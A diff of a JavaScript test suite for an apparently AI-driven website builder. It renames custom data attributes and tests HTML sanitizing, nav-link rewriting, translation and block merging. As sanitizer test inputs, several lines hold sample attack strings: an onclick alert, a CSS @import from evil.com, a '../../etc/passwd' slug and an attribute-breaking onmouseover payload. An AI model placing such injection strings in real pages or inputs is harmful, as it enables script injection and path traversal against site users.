@@ -58,9 +58,9 @@ const r3 = sanitizeSiteHtml('<div onclick="alert(1)" class="foo">bar</div>')
 assert.ok(!r3.includes('onclick'), `FAIL: onclick not stripped — got: ${r3}`)
 assert.ok(r3.includes('class="foo"'), `FAIL: class should survive — got: ${r3}`)
 
-// 4. data-yoai-* attributes are preserved
-const r4 = sanitizeSiteHtml('<section data-yoai-reveal class="grid"><h1>x</h1></section>')
-assert.ok(r4.includes('data-yoai-reveal'), `FAIL: data-yoai-reveal stripped — got: ${r4}`)
+// 4. data-dijimagic-* attributes are preserved
+const r4 = sanitizeSiteHtml('<section data-dijimagic-reveal class="grid"><h1>x</h1></section>')
+assert.ok(r4.includes('data-dijimagic-reveal'), `FAIL: data-dijimagic-reveal stripped — got: ${r4}`)
 assert.ok(r4.includes('class="grid"'), `FAIL: class="grid" stripped — got: ${r4}`)
 assert.ok(r4.includes('<h1>x</h1>'), `FAIL: <h1> stripped — got: ${r4}`)
 
@@ -93,24 +93,24 @@ const r10 = sanitizeSiteHtml('<img src="data:image/png;base64,abc123" alt="test"
 assert.ok(r10.includes('data:image/png;base64,abc123'), `FAIL: data:image/ stripped — got: ${r10}`)
 
 // 11. 'hidden' boolean global attr SURVIVES sanitize (runtime contract — mobile
-//     nav menu starts hidden and yoai-site-runtime.js toggles it). Without this
+//     nav menu starts hidden and dijimagic-site-runtime.js toggles it). Without this
 //     the menu would render OPEN by default on the live site.
 const r11 = sanitizeSiteHtml('<nav id="m" hidden><a href="#x">x</a></nav>')
 assert.ok(r11.includes('hidden'), `FAIL: hidden attr stripped — runtime nav contract broken — got: ${r11}`)
 assert.ok(/<nav[^>]*\bhidden\b/i.test(r11), `FAIL: hidden not present on <nav> — got: ${r11}`)
 
 // 12. Mobile-nav markup contract SURVIVES sanitize: the panel hooks
-//     (data-yoai-mobile-nav + data-yoai-mobile-anim, via the data-* glob) and the
+//     (data-dijimagic-mobile-nav + data-dijimagic-mobile-anim, via the data-* glob) and the
 //     button/panel ARIA (aria-controls / aria-expanded / aria-label / aria-hidden)
-//     are all preserved. yoai-site-runtime.js drives open/close off these; if the
+//     are all preserved. dijimagic-site-runtime.js drives open/close off these; if the
 //     sanitizer stripped them the Tailwind-proof mobile menu would break.
 const r12 = sanitizeSiteHtml(
-  '<button data-yoai-nav-toggle="mobilenav" aria-controls="mobilenav" aria-expanded="false" aria-label="Menü">x</button>' +
-  '<nav id="mobilenav" data-yoai-mobile-nav data-yoai-mobile-anim="left" aria-hidden="true" class="flex"><a href="#x">x</a></nav>',
+  '<button data-dijimagic-nav-toggle="mobilenav" aria-controls="mobilenav" aria-expanded="false" aria-label="Menü">x</button>' +
+  '<nav id="mobilenav" data-dijimagic-mobile-nav data-dijimagic-mobile-anim="left" aria-hidden="true" class="flex"><a href="#x">x</a></nav>',
 )
-assert.ok(r12.includes('data-yoai-mobile-nav'), `FAIL r12: data-yoai-mobile-nav stripped — got: ${r12}`)
-assert.ok(r12.includes('data-yoai-mobile-anim="left"'), `FAIL r12: data-yoai-mobile-anim stripped — got: ${r12}`)
-assert.ok(r12.includes('data-yoai-nav-toggle="mobilenav"'), `FAIL r12: data-yoai-nav-toggle stripped — got: ${r12}`)
+assert.ok(r12.includes('data-dijimagic-mobile-nav'), `FAIL r12: data-dijimagic-mobile-nav stripped — got: ${r12}`)
+assert.ok(r12.includes('data-dijimagic-mobile-anim="left"'), `FAIL r12: data-dijimagic-mobile-anim stripped — got: ${r12}`)
+assert.ok(r12.includes('data-dijimagic-nav-toggle="mobilenav"'), `FAIL r12: data-dijimagic-nav-toggle stripped — got: ${r12}`)
 assert.ok(r12.includes('aria-controls="mobilenav"'), `FAIL r12: aria-controls stripped — got: ${r12}`)
 assert.ok(r12.includes('aria-expanded="false"'), `FAIL r12: aria-expanded stripped — got: ${r12}`)
 assert.ok(/aria-label="Men/i.test(r12), `FAIL r12: aria-label stripped — got: ${r12}`)
@@ -152,21 +152,21 @@ const rM2 = sanitizeSiteHtml('<div style="@import url(https://evil.com/x.css)">x
 assert.ok(!rM2.includes('@import'), `FAIL m2: @import in style not stripped — got: ${rM2}`)
 
 // K1 — KINETIC HOOKS survive sanitize (Modern style = animated/dynamic).
-//   · data-yoai-text-rotate (VALUED — passes the data-* glob)
-//   · data-yoai-count-up + data-yoai-count-suffix (VALUED)
-//   · data-yoai-gradient-anim (VALUELESS — needs allowedEmptyAttributes)
-//   · data-yoai-rotate-interval (VALUED) + the inline gradient style on the same el
+//   · data-dijimagic-text-rotate (VALUED — passes the data-* glob)
+//   · data-dijimagic-count-up + data-dijimagic-count-suffix (VALUED)
+//   · data-dijimagic-gradient-anim (VALUELESS — needs allowedEmptyAttributes)
+//   · data-dijimagic-rotate-interval (VALUED) + the inline gradient style on the same el
 const rK1 = sanitizeSiteHtml(
-  '<h1 data-yoai-text-rotate="Hızlı|Güçlü|Akıllı" data-yoai-rotate-interval="2200">Hızlı</h1>' +
-  '<div data-yoai-gradient-anim style="background-image:var(--gradient-brand)">x</div>' +
-  '<span data-yoai-count-up="1240" data-yoai-count-suffix="+">1240+</span>',
+  '<h1 data-dijimagic-text-rotate="Hızlı|Güçlü|Akıllı" data-dijimagic-rotate-interval="2200">Hızlı</h1>' +
+  '<div data-dijimagic-gradient-anim style="background-image:var(--gradient-brand)">x</div>' +
+  '<span data-dijimagic-count-up="1240" data-dijimagic-count-suffix="+">1240+</span>',
 )
-assert.ok(rK1.includes('data-yoai-text-rotate="Hızlı|Güçlü|Akıllı"'), `FAIL K1: data-yoai-text-rotate stripped — got: ${rK1}`)
-assert.ok(rK1.includes('data-yoai-rotate-interval="2200"'), `FAIL K1: data-yoai-rotate-interval stripped — got: ${rK1}`)
-assert.ok(rK1.includes('data-yoai-gradient-anim'), `FAIL K1: data-yoai-gradient-anim (valueless) stripped — got: ${rK1}`)
+assert.ok(rK1.includes('data-dijimagic-text-rotate="Hızlı|Güçlü|Akıllı"'), `FAIL K1: data-dijimagic-text-rotate stripped — got: ${rK1}`)
+assert.ok(rK1.includes('data-dijimagic-rotate-interval="2200"'), `FAIL K1: data-dijimagic-rotate-interval stripped — got: ${rK1}`)
+assert.ok(rK1.includes('data-dijimagic-gradient-anim'), `FAIL K1: data-dijimagic-gradient-anim (valueless) stripped — got: ${rK1}`)
 assert.ok(rK1.includes('background-image:var(--gradient-brand)'), `FAIL K1: inline gradient style stripped — got: ${rK1}`)
-assert.ok(rK1.includes('data-yoai-count-up="1240"'), `FAIL K1: data-yoai-count-up stripped — got: ${rK1}`)
-assert.ok(rK1.includes('data-yoai-count-suffix="+"'), `FAIL K1: data-yoai-count-suffix stripped — got: ${rK1}`)
+assert.ok(rK1.includes('data-dijimagic-count-up="1240"'), `FAIL K1: data-dijimagic-count-up stripped — got: ${rK1}`)
+assert.ok(rK1.includes('data-dijimagic-count-suffix="+"'), `FAIL K1: data-dijimagic-count-suffix stripped — got: ${rK1}`)
 
 console.log('sanitize OK')
 
@@ -262,10 +262,10 @@ assert.strictEqual(titleMatches, 1, `FAIL A1: expected exactly 1 <title>, got ${
 
 assert.ok(serveDoc.includes('<meta name="viewport"'), `FAIL A1: missing viewport meta`)
 assert.ok(serveDoc.includes('</html>'), `FAIL A1: missing </html>`)
-assert.ok(serveDoc.includes('<script src="/yoai-site-runtime.js"'), `FAIL A1: missing external runtime script tag`)
+assert.ok(serveDoc.includes('<script src="/dijimagic-site-runtime.js"'), `FAIL A1: missing external runtime script tag`)
 
 // serve mode must NOT contain the inlined runtime code
-assert.ok(!serveDoc.includes('yoai-site-runtime v1'), `FAIL A1: serve mode must not inline runtime — found marker 'yoai-site-runtime v1'`)
+assert.ok(!serveDoc.includes('dijimagic-site-runtime v1'), `FAIL A1: serve mode must not inline runtime — found marker 'dijimagic-site-runtime v1'`)
 
 // A2 — preview mode: inlined runtime, no external src reference for runtime
 const previewDoc = await assembleDocument({
@@ -277,12 +277,12 @@ const previewDoc = await assembleDocument({
   mode: 'preview',
 })
 
-assert.ok(previewDoc.includes('yoai-site-runtime v1'), `FAIL A2: preview mode must contain inlined runtime marker 'yoai-site-runtime v1'`)
-assert.ok(!previewDoc.includes('<script src="/yoai-site-runtime.js"'), `FAIL A2: preview mode must not use external runtime script src`)
+assert.ok(previewDoc.includes('dijimagic-site-runtime v1'), `FAIL A2: preview mode must contain inlined runtime marker 'dijimagic-site-runtime v1'`)
+assert.ok(!previewDoc.includes('<script src="/dijimagic-site-runtime.js"'), `FAIL A2: preview mode must not use external runtime script src`)
 assert.ok(previewDoc.includes('fonts.googleapis.com'), `FAIL A2: fontHref not included in preview mode`)
 
 // A2b — EDIT OVERLAY (click-select) injection is EDIT-MODE-ONLY:
-//   - preview + editMode:true  → inlined (marker 'yoai-select v1' present)
+//   - preview + editMode:true  → inlined (marker 'dijimagic-select v1' present)
 //   - preview + editMode:false → ABSENT (normal preview stays byte-clean)
 //   - preview (no editMode arg) → ABSENT (default off)
 //   - serve  + editMode:true   → ABSENT (published /s/ NEVER gets the overlay)
@@ -290,25 +290,25 @@ const editDoc = await assembleDocument({
   bodyHtml: sampleBody, designVars: sampleDesignVars, seo: { title: 'Edit' }, lang: 'tr', fontHref: null,
   mode: 'preview', editMode: true,
 })
-assert.ok(editDoc.includes('yoai-select v1'), `FAIL A2b: preview + editMode:true MUST inline the click-select overlay (marker 'yoai-select v1')`)
-assert.ok(editDoc.includes('yoai-site-runtime v1'), `FAIL A2b: edit-mode preview must STILL include the normal runtime`)
+assert.ok(editDoc.includes('dijimagic-select v1'), `FAIL A2b: preview + editMode:true MUST inline the click-select overlay (marker 'dijimagic-select v1')`)
+assert.ok(editDoc.includes('dijimagic-site-runtime v1'), `FAIL A2b: edit-mode preview must STILL include the normal runtime`)
 
 const editOffDoc = await assembleDocument({
   bodyHtml: sampleBody, designVars: sampleDesignVars, seo: { title: 'NoEdit' }, lang: 'tr', fontHref: null,
   mode: 'preview', editMode: false,
 })
-assert.ok(!editOffDoc.includes('yoai-select v1'), `FAIL A2b: preview + editMode:false MUST NOT inline the overlay`)
+assert.ok(!editOffDoc.includes('dijimagic-select v1'), `FAIL A2b: preview + editMode:false MUST NOT inline the overlay`)
 
 // default (no editMode arg) → off (this is the existing previewDoc above)
-assert.ok(!previewDoc.includes('yoai-select v1'), `FAIL A2b: normal preview (no editMode) MUST NOT inline the overlay`)
+assert.ok(!previewDoc.includes('dijimagic-select v1'), `FAIL A2b: normal preview (no editMode) MUST NOT inline the overlay`)
 
 const editServeDoc = await assembleDocument({
   bodyHtml: sampleBody, designVars: sampleDesignVars, seo: { title: 'Serve' }, lang: 'tr', fontHref: null,
   mode: 'serve', editMode: true,
 })
-assert.ok(!editServeDoc.includes('yoai-select v1'), `FAIL A2b: serve mode MUST NEVER inline the overlay even with editMode:true (published site is clean)`)
+assert.ok(!editServeDoc.includes('dijimagic-select v1'), `FAIL A2b: serve mode MUST NEVER inline the overlay even with editMode:true (published site is clean)`)
 // serve mode is also clean of the normal inline runtime (external script only)
-assert.ok(!serveDoc.includes('yoai-select v1'), `FAIL A2b: serve mode must be clean of the overlay`)
+assert.ok(!serveDoc.includes('dijimagic-select v1'), `FAIL A2b: serve mode must be clean of the overlay`)
 
 console.log('edit-overlay OK')
 
@@ -716,8 +716,8 @@ for (const name of DESIGN_VAR_NAMES) {
 // Anti-generic guard: prompt forbids raw hex + default palette for color
 assert.ok(/FORBIDDEN/i.test(sys), `FAIL H2: prompt missing color-freedom/forbidden directive`)
 assert.ok(sys.includes('{{IMG:'), `FAIL H2: prompt missing {{IMG:}} image-placeholder directive`)
-assert.ok(sys.includes('data-yoai-reveal'), `FAIL H2: prompt missing data-yoai-reveal motion hook`)
-assert.ok(sys.includes('data-yoai-block'), `FAIL H2: prompt missing data-yoai-block section hook`)
+assert.ok(sys.includes('data-dijimagic-reveal'), `FAIL H2: prompt missing data-dijimagic-reveal motion hook`)
+assert.ok(sys.includes('data-dijimagic-block'), `FAIL H2: prompt missing data-dijimagic-block section hook`)
 
 // H2-COLOR — 60-30-10 ACCENT DISCIPLINE (the brand-color-flood fix). The COLOR
 // ethos must teach neutral backgrounds + accent restraint, and must NOT contain
@@ -742,31 +742,31 @@ assert.ok(/NEUTRAL/.test(blockSys), `FAIL H2-BLOCK: block contract must keep the
 // H2b — mobile-menu animation choice threads through buildHtmlSystemPrompt(ctx):
 // no arg / invalid → 'left' (backward-compat); each valid choice is emitted verbatim.
 assert.ok(
-  buildHtmlSystemPrompt().includes('data-yoai-mobile-anim="left"'),
-  `FAIL H2b: default (no ctx) must emit data-yoai-mobile-anim="left"`,
+  buildHtmlSystemPrompt().includes('data-dijimagic-mobile-anim="left"'),
+  `FAIL H2b: default (no ctx) must emit data-dijimagic-mobile-anim="left"`,
 )
 assert.ok(
-  buildHtmlSystemPrompt({ mobileMenuAnim: 'bogus' }).includes('data-yoai-mobile-anim="left"'),
+  buildHtmlSystemPrompt({ mobileMenuAnim: 'bogus' }).includes('data-dijimagic-mobile-anim="left"'),
   `FAIL H2b: invalid mobileMenuAnim must coerce to "left"`,
 )
 for (const v of ['left', 'right', 'top']) {
   const p = buildHtmlSystemPrompt({ mobileMenuAnim: v })
   assert.ok(
-    p.includes(`data-yoai-mobile-anim="${v}"`),
+    p.includes(`data-dijimagic-mobile-anim="${v}"`),
     `FAIL H2b: mobileMenuAnim="${v}" not emitted on the mobile panel`,
   )
 }
 
 // H2c — STYLE-CONDITIONAL MOTION: style='modern' injects the kinetic/animated
-// motion block + advertises the new data-yoai-* hooks; non-modern stays calmer.
+// motion block + advertises the new data-dijimagic-* hooks; non-modern stays calmer.
 const sysModern = buildHtmlSystemPrompt({ style: 'modern' })
 assert.ok(/ANIMATED|KINETIC|DYNAMIC/i.test(sysModern), `FAIL H2c: modern prompt missing animated/kinetic motion directive`)
-for (const hook of ['data-yoai-text-rotate', 'data-yoai-gradient-anim', 'data-yoai-count-up']) {
+for (const hook of ['data-dijimagic-text-rotate', 'data-dijimagic-gradient-anim', 'data-dijimagic-count-up']) {
   assert.ok(sysModern.includes(hook), `FAIL H2c: modern prompt missing hook ${hook}`)
 }
 // The allowed-hook list advertises the new hooks for EVERY style (not just modern).
 const sysMinimal = buildHtmlSystemPrompt({ style: 'minimal' })
-for (const hook of ['data-yoai-text-rotate', 'data-yoai-gradient-anim', 'data-yoai-count-up']) {
+for (const hook of ['data-dijimagic-text-rotate', 'data-dijimagic-gradient-anim', 'data-dijimagic-count-up']) {
   assert.ok(sysMinimal.includes(hook), `FAIL H2c: allowed-hook list missing ${hook} for non-modern`)
 }
 // Non-modern does NOT carry the heavy "ANIMATED / KINETIC / DYNAMIC" header.
@@ -907,11 +907,11 @@ assert.ok(
 console.log('orchestrator OK')
 
 // ---------------------------------------------------------------------------
-// MULTIPAGE section — page-list validation + data-yoai-href → href rewrite
+// MULTIPAGE section — page-list validation + data-dijimagic-href → href rewrite
 //
 // (a) validatePagePlan: valid list passes; invalid slugs are coerced/dropped;
 //     home + contact enforced; cap at 6; unique url-safe slugs; home first.
-// (b) rewriteNavLinks / resolveNavHref: data-yoai-href resolves to a safe path;
+// (b) rewriteNavLinks / resolveNavHref: data-dijimagic-href resolves to a safe path;
 //     home → base; no double slash; arbitrary/non-listed slug not injected.
 // ---------------------------------------------------------------------------
 
@@ -1051,20 +1051,20 @@ assert.strictEqual(resolveNavHref('home', { linkBase: '/website-preview/abc', na
 assert.strictEqual(resolveNavHref('../../etc/passwd', { linkBase: '/s/acme', navMode: 'path' }), '/s/acme', `FAIL MP7: unsafe slug must NOT be injected (path)`)
 assert.strictEqual(resolveNavHref('a"onmouseover=alert(1)', { linkBase: '/s/acme', navMode: 'query' }), '/s/acme?slug=home', `FAIL MP7: unsafe slug must NOT be injected (query)`)
 
-// MP8 — rewriteNavLinks: injects real href on data-yoai-href anchors; keeps data attr
+// MP8 — rewriteNavLinks: injects real href on data-dijimagic-href anchors; keeps data attr
 const navBody =
   '<header><nav>' +
-  '<a data-yoai-href="home">Anasayfa</a>' +
-  '<a data-yoai-href="hakkimizda" aria-current="page">Hakkımızda</a>' +
+  '<a data-dijimagic-href="home">Anasayfa</a>' +
+  '<a data-dijimagic-href="hakkimizda" aria-current="page">Hakkımızda</a>' +
   '</nav></header>'
 const rw = rewriteNavLinks(navBody, { linkBase: '/s/acme', navMode: 'path' })
 assert.ok(rw.includes('href="/s/acme"'), `FAIL MP8: home anchor must get href="/s/acme" — got: ${rw}`)
 assert.ok(rw.includes('href="/s/acme/hakkimizda"'), `FAIL MP8: sub-page anchor href — got: ${rw}`)
 assert.ok(rw.includes('aria-current="page"'), `FAIL MP8: aria-current must be preserved — got: ${rw}`)
-assert.ok(rw.includes('data-yoai-href="hakkimizda"'), `FAIL MP8: data-yoai-href kept — got: ${rw}`)
+assert.ok(rw.includes('data-dijimagic-href="hakkimizda"'), `FAIL MP8: data-dijimagic-href kept — got: ${rw}`)
 
 // MP9 — rewriteNavLinks no-op when linkBase absent (landing single-page path)
-const landingBody = '<a data-yoai-href="x">x</a>'
+const landingBody = '<a data-dijimagic-href="x">x</a>'
 assert.strictEqual(rewriteNavLinks(landingBody, {}), landingBody, `FAIL MP9: no linkBase must be a no-op`)
 assert.strictEqual(rewriteNavLinks(landingBody, undefined), landingBody, `FAIL MP9: undefined opts must be a no-op`)
 
@@ -1073,7 +1073,7 @@ const rwClean = sanitizeSiteHtml(rewriteNavLinks(navBody, { linkBase: '/s/acme',
 assert.ok(rwClean.includes('href="/s/acme/hakkimizda"'), `FAIL MP10: internal href stripped by sanitizer — got: ${rwClean}`)
 assert.ok(!rwClean.includes('javascript:'), `FAIL MP10: no unsafe scheme present`)
 
-// MP11 — SLUG-SET-AWARE: with knownSlugs, a data-yoai-href to a page that does NOT
+// MP11 — SLUG-SET-AWARE: with knownSlugs, a data-dijimagic-href to a page that does NOT
 // exist resolves to the HOME base (no 404). A known slug still resolves to its path.
 // Injection (javascript:/../) still falls back to base. knownSlugs omitted → legacy
 // shape-only behaviour (back-compat) keeps resolving any url-safe slug to a path.
@@ -1115,18 +1115,18 @@ assert.strictEqual(
 )
 
 // MP12 — rewriteNavLinks slug-set-aware end-to-end: body with a KNOWN and an UNKNOWN
-// data-yoai-href. Known → /s/acme/hakkimizda; unknown 'blog' → /s/acme (home base),
+// data-dijimagic-href. Known → /s/acme/hakkimizda; unknown 'blog' → /s/acme (home base),
 // and the document must NOT contain a 404-bound /s/acme/blog href.
 const navBodyMixed =
   '<nav>' +
-  '<a data-yoai-href="hakkimizda">Hakkımızda</a>' +
-  '<a data-yoai-href="blog">Blog</a>' +
+  '<a data-dijimagic-href="hakkimizda">Hakkımızda</a>' +
+  '<a data-dijimagic-href="blog">Blog</a>' +
   '</nav>'
 const rwSet = rewriteNavLinks(navBodyMixed, { linkBase: '/s/acme', navMode: 'path', knownSlugs: known })
 assert.ok(rwSet.includes('href="/s/acme/hakkimizda"'), `FAIL MP12: known slug href missing — got: ${rwSet}`)
 assert.ok(!rwSet.includes('href="/s/acme/blog"'), `FAIL MP12: unknown slug must NOT produce /s/acme/blog — got: ${rwSet}`)
 // the unknown 'blog' anchor must instead carry the home base href
-assert.ok(/data-yoai-href="blog" href="\/s\/acme"/.test(rwSet), `FAIL MP12: unknown 'blog' anchor must resolve to home base /s/acme — got: ${rwSet}`)
+assert.ok(/data-dijimagic-href="blog" href="\/s\/acme"/.test(rwSet), `FAIL MP12: unknown 'blog' anchor must resolve to home base /s/acme — got: ${rwSet}`)
 
 console.log('multipage OK')
 
@@ -1150,13 +1150,13 @@ const {
 
 // A faithful structure-preserving sample: text nodes, translatable attrs (alt,
 // aria-label, title, placeholder) AND structural bits that must NOT change
-// (classes, data-yoai-*, href, src, inline style).
+// (classes, data-dijimagic-*, href, src, inline style).
 const mlBody =
-  '<header class="site-head" data-yoai-block="header">' +
-  '<a href="/contact" class="cta" data-yoai-href="contact" title="Bize ulaşın">İletişim</a>' +
+  '<header class="site-head" data-dijimagic-block="header">' +
+  '<a href="/contact" class="cta" data-dijimagic-href="contact" title="Bize ulaşın">İletişim</a>' +
   '<nav aria-label="Ana menü"><a href="#x">Anasayfa</a></nav>' +
   '</header>' +
-  '<main><h1 class="text-4xl" data-yoai-reveal>Merhaba Dünya</h1>' +
+  '<main><h1 class="text-4xl" data-dijimagic-reveal>Merhaba Dünya</h1>' +
   '<img src="https://cdn.example.com/a.jpg" class="hero" alt="Bir kahve fincanı">' +
   '<input type="email" placeholder="E-posta adresiniz" class="field">' +
   '<p>Hoş geldiniz.</p></main>'
@@ -1178,12 +1178,12 @@ assert.ok(mlOut.includes('aria-label="[EN] Ana menü"'), `FAIL ML2: aria-label n
 assert.ok(mlOut.includes('title="[EN] Bize ulaşın"'), `FAIL ML2: title not translated — got: ${mlOut}`)
 assert.ok(mlOut.includes('placeholder="[EN] E-posta adresiniz"'), `FAIL ML2: placeholder not translated — got: ${mlOut}`)
 
-// (b) STRUCTURE PRESERVED: tags / classes / data-yoai-* / href / src / type UNCHANGED
+// (b) STRUCTURE PRESERVED: tags / classes / data-dijimagic-* / href / src / type UNCHANGED
 assert.ok(mlOut.includes('class="site-head"'), `FAIL ML3: class changed — got: ${mlOut}`)
 assert.ok(mlOut.includes('class="text-4xl"'), `FAIL ML3: h1 class changed — got: ${mlOut}`)
-assert.ok(mlOut.includes('data-yoai-block="header"'), `FAIL ML3: data-yoai-block changed — got: ${mlOut}`)
-assert.ok(mlOut.includes('data-yoai-href="contact"'), `FAIL ML3: data-yoai-href changed — got: ${mlOut}`)
-assert.ok(mlOut.includes('data-yoai-reveal'), `FAIL ML3: data-yoai-reveal stripped — got: ${mlOut}`)
+assert.ok(mlOut.includes('data-dijimagic-block="header"'), `FAIL ML3: data-dijimagic-block changed — got: ${mlOut}`)
+assert.ok(mlOut.includes('data-dijimagic-href="contact"'), `FAIL ML3: data-dijimagic-href changed — got: ${mlOut}`)
+assert.ok(mlOut.includes('data-dijimagic-reveal'), `FAIL ML3: data-dijimagic-reveal stripped — got: ${mlOut}`)
 assert.ok(mlOut.includes('href="/contact"'), `FAIL ML3: href changed — got: ${mlOut}`)
 assert.ok(mlOut.includes('href="#x"'), `FAIL ML3: nav href changed — got: ${mlOut}`)
 assert.ok(mlOut.includes('src="https://cdn.example.com/a.jpg"'), `FAIL ML3: img src changed — got: ${mlOut}`)
@@ -1252,7 +1252,7 @@ assert.deepStrictEqual(
 
 // (b, extra) translated output survives the shared sanitizer (structure-safe by construction)
 const mlClean = sanitizeSiteHtml(mlOut)
-assert.ok(mlClean.includes('data-yoai-href="contact"'), `FAIL ML10: data-yoai-* stripped by sanitizer`)
+assert.ok(mlClean.includes('data-dijimagic-href="contact"'), `FAIL ML10: data-dijimagic-* stripped by sanitizer`)
 assert.ok(mlClean.includes('[EN] Merhaba Dünya'), `FAIL ML10: translated text lost after sanitize`)
 
 // ML11 — ADVERSARIAL: a malicious attribute translation must be NEUTRALISED in the
@@ -1344,13 +1344,13 @@ const {
 // Attribute order/spacing/void-element/single-quote quirks prove the BYTE-EXACT slice
 // (not cheerio re-serialization).
 const bpBody =
-  '<header data-yoai-block="hero" data-yoai-id="b1" class="hero"><h1>Merhaba</h1>' +
+  '<header data-dijimagic-block="hero" data-dijimagic-id="b1" class="hero"><h1>Merhaba</h1>' +
   '<img src="https://cdn.example.com/a.jpg" alt="x" width="800" height="600" loading="lazy"></header>\n' +
   '<main>\n' +
-  '  <section data-yoai-id="b2"  data-yoai-block="services" class="grid"><h2>Hizmetler</h2><p>İçerik bir iki üç dört beş.</p></section>\n' +
-  '  <section data-yoai-id="b3" data-yoai-block="proof"><h2>Kanıt</h2><p>Mutlu müşteriler bir iki üç.</p></section>\n' +
+  '  <section data-dijimagic-id="b2"  data-dijimagic-block="services" class="grid"><h2>Hizmetler</h2><p>İçerik bir iki üç dört beş.</p></section>\n' +
+  '  <section data-dijimagic-id="b3" data-dijimagic-block="proof"><h2>Kanıt</h2><p>Mutlu müşteriler bir iki üç.</p></section>\n' +
   '</main>\n' +
-  "<footer data-yoai-block='footer' data-yoai-id=\"b4\"><p>Alt bilgi</p></footer>"
+  "<footer data-dijimagic-block='footer' data-dijimagic-id=\"b4\"><p>Alt bilgi</p></footer>"
 
 // BP1 — extractBlocks: FOUR blocks found — incl. b2+b3 INSIDE <main> (the H bug only
 // found header/footer). ids+roles in document order, BYTE-EXACT outerHTML slices.
@@ -1367,18 +1367,18 @@ for (const b of bpBlocks) {
   assert.ok(bpBody.includes(b.html), `FAIL BP1: block ${b.id} html is not a verbatim slice of the source — got: ${b.html}`)
 }
 // the services block must keep its ODD double-space between attributes (no normalization)
-assert.ok(bpBlocks[1].html.includes('data-yoai-id="b2"  data-yoai-block'), `FAIL BP1: byte-exact slice lost the original attribute spacing — got: ${bpBlocks[1].html}`)
+assert.ok(bpBlocks[1].html.includes('data-dijimagic-id="b2"  data-dijimagic-block'), `FAIL BP1: byte-exact slice lost the original attribute spacing — got: ${bpBlocks[1].html}`)
 // the footer block must keep its single-quoted attribute (cheerio would re-quote it)
-assert.ok(bpBlocks[3].html.includes("data-yoai-block='footer'"), `FAIL BP1: byte-exact slice normalized the single-quoted attr — got: ${bpBlocks[3].html}`)
-// neither <main> nor its open/close tags are themselves blocks (no data-yoai-id on them)
+assert.ok(bpBlocks[3].html.includes("data-dijimagic-block='footer'"), `FAIL BP1: byte-exact slice normalized the single-quoted attr — got: ${bpBlocks[3].html}`)
+// neither <main> nor its open/close tags are themselves blocks (no data-dijimagic-id on them)
 assert.ok(!bpBlocks.some((b) => b.html.startsWith('<main')), `FAIL BP1: <main> wrapper must NOT be treated as a block`)
 
 // BP2 — extractBlocks on empty / id-less input → []
 assert.deepStrictEqual(extractBlocks(''), [], `FAIL BP2: empty input must yield []`)
 assert.deepStrictEqual(extractBlocks('<main><section class="x"><p>no id</p></section></main>'), [], `FAIL BP2: id-less blocks must yield []`)
-// TOP-MOST only: a data-yoai-id nested INSIDE another block is not double-counted
-const nested = extractBlocks('<section data-yoai-id="b1"><div data-yoai-id="bX">inner</div></section>')
-assert.strictEqual(nested.length, 1, `FAIL BP2: nested data-yoai-id must NOT be double-counted — got: ${nested.length}`)
+// TOP-MOST only: a data-dijimagic-id nested INSIDE another block is not double-counted
+const nested = extractBlocks('<section data-dijimagic-id="b1"><div data-dijimagic-id="bX">inner</div></section>')
+assert.strictEqual(nested.length, 1, `FAIL BP2: nested data-dijimagic-id must NOT be double-counted — got: ${nested.length}`)
 assert.strictEqual(nested[0].id, 'b1', `FAIL BP2: only the top-most block survives — got: ${nested[0].id}`)
 
 // BP3 — summarizeBlocks: id + role + short visible-text snippet (no markup)
@@ -1390,7 +1390,7 @@ assert.ok(!bpSum[0].snippet.includes('<'), `FAIL BP3: snippet must not contain m
 
 // BP4 — mergeBlocks EDIT the HERO (b1, above <main>): ONLY b1 changes; <main>, b2, b3, b4
 // stay BYTE-IDENTICAL (this is the exact scenario that USED to silently delete <main>).
-const editedB1 = '<header data-yoai-block="hero" data-yoai-id="b1" class="hero hero--dark"><h1>YENİ Başlık</h1></header>'
+const editedB1 = '<header data-dijimagic-block="hero" data-dijimagic-id="b1" class="hero hero--dark"><h1>YENİ Başlık</h1></header>'
 const mEdit = mergeBlocks(bpBody, bpBlocks, [{ op: 'edit', targetId: 'b1' }], { b1: editedB1 })
 assert.ok(mEdit.includes(editedB1), `FAIL BP4: edited b1 html missing — got: ${mEdit}`)
 assert.ok(mEdit.includes('<main>'), `FAIL BP4: <main> wrapper MUST survive a hero edit (the H bug deleted it) — got: ${mEdit}`)
@@ -1403,7 +1403,7 @@ const mainOnward = bpBody.slice(bpBody.indexOf('<main'))
 assert.ok(mEdit.includes(mainOnward), `FAIL BP4: everything from <main> onward must be byte-identical — got: ${mEdit}`)
 
 // BP4b — mergeBlocks EDIT a section INSIDE <main> (b2): only b2 changes; <main>, b1, b3, b4 intact
-const editedB2 = '<section data-yoai-block="services" data-yoai-id="b2"><h2>YENİ Hizmetler</h2></section>'
+const editedB2 = '<section data-dijimagic-block="services" data-dijimagic-id="b2"><h2>YENİ Hizmetler</h2></section>'
 const mEdit2 = mergeBlocks(bpBody, bpBlocks, [{ op: 'edit', targetId: 'b2' }], { b2: editedB2 })
 assert.ok(mEdit2.includes(editedB2), `FAIL BP4b: edited b2 html missing — got: ${mEdit2}`)
 assert.ok(mEdit2.includes('<main>') && mEdit2.includes('</main>'), `FAIL BP4b: <main> wrapper must survive editing a block inside it — got: ${mEdit2}`)
@@ -1418,11 +1418,11 @@ assert.ok(mEdit2.indexOf('<main>') < mEdit2.indexOf(editedB2) && mEdit2.indexOf(
 const mDel = mergeBlocks(bpBody, bpBlocks, [{ op: 'delete', targetId: 'b3' }], {})
 assert.ok(mDel.includes('<main>') && mDel.includes('</main>'), `FAIL BP5: <main> must survive deleting a block inside it — got: ${mDel}`)
 assert.ok(mDel.includes(bpBlocks[0].html) && mDel.includes(bpBlocks[1].html) && mDel.includes(bpBlocks[3].html), `FAIL BP5: surviving blocks must stay byte-identical — got: ${mDel}`)
-assert.ok(!mDel.includes('data-yoai-id="b3"'), `FAIL BP5: deleted b3 must be gone — got: ${mDel}`)
+assert.ok(!mDel.includes('data-dijimagic-id="b3"'), `FAIL BP5: deleted b3 must be gone — got: ${mDel}`)
 assert.ok(!mDel.includes('Mutlu müşteriler'), `FAIL BP5: deleted b3 content must be gone — got: ${mDel}`)
 
 // BP6 — mergeBlocks INSERT after b1: new block lands between b1 (header) and <main>, others byte-identical
-const newBlock = '<section data-yoai-block="cta" data-yoai-id="b9"><h2>Yeni CTA</h2></section>'
+const newBlock = '<section data-dijimagic-block="cta" data-dijimagic-id="b9"><h2>Yeni CTA</h2></section>'
